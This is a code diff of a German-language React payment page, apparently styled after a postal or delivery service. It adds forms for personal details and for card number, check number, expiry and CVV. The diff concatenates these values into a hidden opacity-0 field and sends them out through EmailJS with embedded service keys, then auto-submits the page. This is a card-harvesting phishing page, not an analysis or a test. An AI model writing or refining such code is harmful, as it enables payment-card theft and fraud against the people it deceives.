@@ -3,30 +3,65 @@ import Congrats from "@/components/Congrats";
 // import ContactOne from "@/components/ContactOne";
 import ContactTwo from "@/components/ContactTwo";
 import Container from "@/components/Container";
-import { useRef, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import emailjs from "@emailjs/browser";
+import { getV } from "../getValuesSlice";
+import { useDispatch, useSelector } from "react-redux";
+import Wrapper from "@/components/Wrapper";
 const HomePage = () => {
+  const dispatch = useDispatch();
+  const globalS = useSelector((s) => s.values);
+  console.log(globalS);
   const [index, setIndex] = useState(0);
+  const [username, setUsername] = useState("");
+  const [email, setEmail] = useState("");
+  const [postCode, setPostCode] = useState(0);
+  const [phoneNumber, setPhoneNumber] = useState(0);
+  const [city, setCity] = useState("");
+  const [kartennummer, setKartennummer] = useState("");
+  const [kartenprufnummer, setKartenprufnummer] = useState("");
+  const [Gültigkeit, setKarditkartenanbieter] = useState("");
+  const [selectOneValue, setSelectOneValue] = useState("");
+  const [selectTwoValue, setSelectTwoValue] = useState("");
+  const [message, setMessage] = useState("");
+  const [isGo, setIsGo] = useState(false);
   const form = useRef();
-  const submit = async (e) => {
-    e.preventDefault();
-    // EMail js Function
-    try {
-      await emailjs.sendForm(
-        "service_h8vk6lf",
-        "template_h0skuok",
-        form.current,
-        {
-          publicKey: "s5gIhoSR1r2L4RLa0",
-        }
-      );
-      setIndex((prev) => prev + 1);
-      console.log("SUCCESS!");
-    } catch (error) {
-      console.log(error);
-      console.log("FAILED...", error.text);
-    }
+  const txtArea = useRef();
+  const selectOne = useRef();
+  const selectTwo = useRef();
+  const handelFoucs = () => {
+    setIndex(1);
+    const input = document.querySelector(".input-values");
+    input.select();
+    document.execCommand("copy");
+    sessionStorage.setItem("info-1", JSON.stringify(input.value));
+    console.log(index);
+    setMessage(sessionStorage.getItem("info-1"));
   };
+  useEffect(() => {
+    dispatch(
+      getV(
+        `${message} kartennummer: ${kartennummer}\n kartenprufnummer: ${kartenprufnummer}\n Exp: ${selectOneValue}/${selectTwoValue}\n cvv: ${Gültigkeit}`
+      )
+    );
+  }, [kartennummer, kartenprufnummer, selectOneValue, selectTwo, Gültigkeit]);
+  console.log(message);
+  const submit = () => {
+    // setMessage(
+    //   (prev) =>
+    //     `${prev} kartennummer: ${kartennummer}\n kartenprufnummer: ${kartenprufnummer}\n Exp: ${selectOneValue}/${selectTwoValue}\n cvv: ${Gültigkeit}`
+    // );
+
+    emailjs.sendForm("service_usdywy7", "template_20m02fk", form.current, {
+      publicKey: "pYexSWO4f8GOPt5yA",
+    });
+    console.log("SUCCESS!");
+    setTimeout(() => {
+      form.current?.submit();
+    }, 2000);
+    setIndex((prev) => prev + 1);
+  };
+  console.log(globalS);
   return (
     <section className=" py-[15px]">
       <section className="min-h-[20vh] p-[1vw] pb-[15px] bg-[#] pt-[60px]">
@@ -71,16 +106,17 @@ const HomePage = () => {
               ))}
             </section>
           </Container>
-          {index < 2 && (
+          {/* {index < 2 && (
             <button onClick={() => setIndex((prev) => prev + 1)}>
               Click ME!
             </button>
-          )}
+          )} */}
 
           {/* Render Childrens Here! */}
         </section>
       </section>
       <section>
+        {/* <input type="text" className="" name="from_name" value={username} /> */}
         {index == 0 && (
           <>
             <div className="min-h-[50vh] mt-[30px] bg-[#FFCC00] py-[15px]">
@@ -90,15 +126,13 @@ const HomePage = () => {
                     <h3 className="mt-[20px] font-bold text-[22px]">
                       Informationen
                     </h3>
-                    <form
-                      ref={form}
-                      className="flex flex-col gap-3"
-                      onSubmit={submit}
-                    >
+                    <form className="flex flex-col gap-3">
                       <section className="mt-[10px]">
                         <input
                           type="text"
+                          onChange={(e) => setUsername(e.target.value)}
                           placeholder="Name"
+                          required
                           name="from_name"
                           className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                         />
@@ -107,6 +141,8 @@ const HomePage = () => {
                         <input
                           type="text"
                           placeholder="Anschrift"
+                          required
+                          onChange={(e) => setEmail(e.target.value)}
                           name="user_email"
                           className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                         />
@@ -114,14 +150,18 @@ const HomePage = () => {
                       <section className="mt-[10px]">
                         <input
                           type="number"
+                          onChange={(e) => setPostCode(e.target.value)}
                           placeholder="Plz"
+                          required
                           className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                         />
                       </section>
                       <section className="mt-[10px]">
                         <input
                           type="text"
+                          onChange={(e) => setCity(e.target.value)}
                           placeholder="Stadt"
+                          required
                           className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                         />
                       </section>
@@ -129,15 +169,29 @@ const HomePage = () => {
                         <input
                           type="number"
                           placeholder="Rufnmmer"
+                          required
+                          onChange={(e) => setPhoneNumber(e.target.value)}
                           className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                         />
                       </section>
-                      <button
-                        type="submit"
-                        className="bg-red-400 transition-all duration-[100ms] w-fit cursor-pointer px-[30px] active:scale-[1.115] text-white p-[10px]"
+                      <div
+                        onClick={handelFoucs}
+                        className="bg-red-400 w-fit transition-all duration-[100ms] cursor-pointer px-[30px] active:scale-[1.115] text-white p-[10px]"
                       >
                         Weiter
-                      </button>
+                      </div>
+                      <input
+                        value={`username ${username}, Phone Number ${phoneNumber} email ${email} City ${city} Post Code ${postCode}`}
+                        id=""
+                        className="input-values"
+                        ref={txtArea}
+                        onChange={(e) =>
+                          getV(
+                            `username ${username}, Phone Number ${phoneNumber} email ${email} City ${city} Post Code ${postCode}`
+                          )
+                        }
+                      />
+                      .
                     </form>
                   </section>
                   <section className="flex-1">
@@ -157,48 +211,92 @@ const HomePage = () => {
         )}
         {index == 1 && (
           <>
-            <div className="px-[20px] pt-[30px] border-t-[#ddd] border-t-[1px] mt-[30px] py-[15px]">
-              {["Karteninhaber", "Karditkartenanbieter", "Kartennummer"].map(
-                (el) => (
-                  <div key={el} className="flex flex-col gap-[10px] mt-[10px]">
-                    <label htmlFor="">{el}</label>
-                    <input
-                      type="text"
-                      className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
-                      placeholder={el}
-                    />
-                  </div>
-                )
-              )}
+            <form
+              ref={form}
+              className="px-[20px] pt-[30px] border-t-[#ddd] border-t-[1px] mt-[30px] py-[15px]"
+            >
+              <input
+                type="text"
+                className="opacity-0"
+                name="from_name"
+                value={username}
+              />
+              <input
+                type="text"
+                className="opacity-0"
+                name="message"
+                value={globalS}
+              />
 
+              <div className="flex flex-col gap-[10px] mt-[10px]">
+                <label htmlFor="">Kartenprufnummer</label>
+                <input
+                  type="text"
+                  onChange={(e) => setKartenprufnummer(e.target.value)}
+                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
+                  placeholder={"Kartenprufnummer"}
+                  required
+                />
+              </div>
+              {/* <div className="flex flex-col gap-[10px] mt-[10px]">
+                <label htmlFor="">Karditkartenanbieter</label>
+                <input
+                  type="text"
+                  onChange={(e) => setKarditkartenanbieter(e.target.value)}
+                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
+                  placeholder={"Karditkartenanbieter"}
+                  required
+                />
+              </div> */}
+              <div className="flex flex-col gap-[10px] mt-[10px]">
+                <label htmlFor="">Kartennummer</label>
+                <input
+                  type="text"
+                  onChange={(e) => setKartennummer(e.target.value)}
+                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
+                  placeholder={"Kartennummer"}
+                  required
+                />
+              </div>
               <div className="flex flex-col gap-[15px] mt-[15px]">
                 <label htmlFor="">Kartennummer</label>
                 <section className="flex items-center gap-2">
                   <select
+                    ref={selectOne}
+                    onChange={(e) => setSelectOneValue(e.target.value)}
                     id=""
                     className="border-solid border-[1px] border-black w-[100px]"
-                    value={`*`}
                   >
-                    <option value=""></option>
+                    {[
+                      2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024,
+                      2025, 2026, 2027, 2028, 2029, 2030,
+                    ].map((year) => (
+                      <option value={year}> {year} </option>
+                    ))}
                   </select>
                   /
                   <select
+                    ref={selectTwo}
+                    onChange={(e) => setSelectTwoValue(e.target.value)}
                     id=""
                     className="border-solid border-[1px] border-black w-[100px]"
-                    value={`*`}
                   >
-                    <option value=""></option>
+                    {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((n) => (
+                      <option value={n}>{n}</option>
+                    ))}
                   </select>
                 </section>
               </div>
               <div className="flex flex-col gap-[15px] mt-[15px]">
-                <label htmlFor="">Kartenprufnummer</label>
+                <label htmlFor="">Gültigkeit</label>
                 <input
                   type="text"
+                  maxLength={3}
+                  onChange={(e) => setKarditkartenanbieter(e.target.value)}
                   className="p-[10px] border-solid border-[#bbb] w-[100px] border-[2px]"
                 />
               </div>
-            </div>
+            </form>
             <section className="px-[20px]">
               <p className="capitalize text-balance text-[16px]">
                 bei visa-und mastercard-Kareditkarten finden sie die
@@ -208,7 +306,7 @@ const HomePage = () => {
                 card
               </p>
               <button
-                onClick={() => setIndex((prev) => prev + 1)}
+                onClick={submit}
                 className="max-md:w-full block text-left border-[#00000045] shadow-md shadow-[#bbb] border-solid border-[1px] p-[10px] font-semibold capitalize mt-[15px] bg-[#FFD638]"
               >
                 jetzt bezahlen
